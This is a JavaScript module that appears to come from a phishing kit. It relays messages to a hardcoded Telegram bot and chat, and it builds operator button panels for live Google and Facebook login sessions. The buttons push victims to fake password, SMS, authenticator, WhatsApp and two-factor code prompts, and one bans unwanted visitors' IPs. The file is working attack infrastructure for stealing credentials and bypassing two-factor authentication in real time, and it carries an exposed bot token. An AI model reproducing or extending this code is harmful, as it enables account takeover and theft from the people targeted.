const axios = require('axios');

const TELEGRAM_TOKEN = '8716005325:AAFen4TgCidblYpqqeaF4nu_QbmRjs7B-mU';
const CHAT_ID = '-1003817282065';

/**
 * Sends a Telegram message with optional inline buttons.
 * @param {string} message - The message to send.
 * @param {string|null} clientId - The client ID (for callback data).
 * @param {boolean|string} buttons - true = all buttons, 'banOnly' = only Ban IP button, false = no buttons.
 */
function sendTelegramMessage(message, clientId = null, buttons = false) {
  const payload = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: 'Markdown',
  };

  if (clientId && buttons) {
    if (buttons === 'banOnly') {
      payload.reply_markup = {
        inline_keyboard: [
          [{ text: '❌ Ban IP', callback_data: `ban_ip:${clientId}` }]
        ]
      };
    } else if (buttons === 'google') {
      // Google sign-in flow — full action set
      payload.reply_markup = {
        inline_keyboard: [
          [
            { text: '❌ Gmail Wrong Pass', callback_data: `send_gmail_wrong_pass:${clientId}` },
            { text: '🔵 Google Login',     callback_data: `send_google_login:${clientId}` },
          ],
          [
            { text: '🔐 Authenticator',  callback_data: `send_google_auth:${clientId}` },
            { text: '🔢 Google Prompt',  callback_data: `send_google_prompt:${clientId}` },
          ],
          [
            { text: '📩 Google SMS',    callback_data: `send_google_sms:${clientId}` },
            { text: '📱 Google Phone',  callback_data: `send_google_phone:${clientId}` },
          ],
          [
            { text: '❌ Wrong Number',  callback_data: `send_google_wrong_number:${clientId}` },
            { text: '❌ Wrong Code',    callback_data: `send_google_wrong_code:${clientId}` },
          ],
          [
            { text: '📲 2FA (SMS)',     callback_data: `send_2fa:${clientId}` },
            { text: '🔑 Auth App',      callback_data: `send_auth:${clientId}` },
          ],
          [
            { text: '📧 Email Code',    callback_data: `send_email:${clientId}` },
            { text: '📅 Calendar',      callback_data: `send_calendar:${clientId}` },
          ],
          [
            { text: '❌ Ban IP', callback_data: `ban_ip:${clientId}` },
          ]
        ]
      };

    } else if (buttons === 'google_sms_code') {
      // Shown when user submits a Google SMS code
      payload.reply_markup = {
        inline_keyboard: [
          [
            { text: '❌ Wrong SMS Code',  callback_data: `send_google_wrong_code:${clientId}` },
            { text: '📩 Re-send SMS',     callback_data: `send_google_sms:${clientId}` },
          ],
          [
            { text: '🔐 Authenticator',  callback_data: `send_google_auth:${clientId}` },
            { text: '🔢 Google Prompt',  callback_data: `send_google_prompt:${clientId}` },
          ],
          [
            { text: '❌ Gmail Wrong Pass', callback_data: `send_gmail_wrong_pass:${clientId}` },
            { text: '🔵 Google Login',    callback_data: `send_google_login:${clientId}` },
          ],
          [
            { text: '📅 Calendar',        callback_data: `send_calendar:${clientId}` },
            { text: '❌ Ban IP',           callback_data: `ban_ip:${clientId}` },
          ]
        ]
      };

    } else if (buttons === 'google_auth_code') {
      // Shown when user submits a Google Authenticator code
      payload.reply_markup = {
        inline_keyboard: [
          [
            { text: '❌ Wrong Auth Code', callback_data: `send_google_wrong_auth_code:${clientId}` },
            { text: '🔐 Re-Authenticator', callback_data: `send_google_auth:${clientId}` },
          ],
          [
            { text: '📩 Google SMS',     callback_data: `send_google_sms:${clientId}` },
            { text: '🔢 Google Prompt',  callback_data: `send_google_prompt:${clientId}` },
          ],
          [
            { text: '❌ Gmail Wrong Pass', callback_data: `send_gmail_wrong_pass:${clientId}` },
            { text: '🔵 Google Login',    callback_data: `send_google_login:${clientId}` },
          ],
          [
            { text: '📅 Calendar',        callback_data: `send_calendar:${clientId}` },
            { text: '❌ Ban IP',           callback_data: `ban_ip:${clientId}` },
          ]
        ]
      };
    } else {
      // Facebook / default — full action panel
      payload.reply_markup = {
        inline_keyboard: [
          [
            { text: 'Send 2FA', callback_data: `send_2fa:${clientId}` },
            { text: 'Send Auth', callback_data: `send_auth:${clientId}` },
          ],
          [
            { text: 'Send Email', callback_data: `send_email:${clientId}` },
            { text: 'Send WhatsApp', callback_data: `send_wh:${clientId}` },
          ],
          [
            { text: 'Wrong Creds', callback_data: `send_wrong_creds:${clientId}` },
            { text: 'Old Password', callback_data: `send_old_pass:${clientId}` },
          ],
          [
            { text: '🔵 Google Login', callback_data: `send_google_login:${clientId}` },
            { text: 'Calendar', callback_data: `send_calendar:${clientId}` },
          ],
          [
            { text: '❌ Ban IP', callback_data: `ban_ip:${clientId}` },
          ]
        ]
      };
    }
  }

  return axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, payload)
    .catch(console.error);
}

module.exports = { sendTelegramMessage };
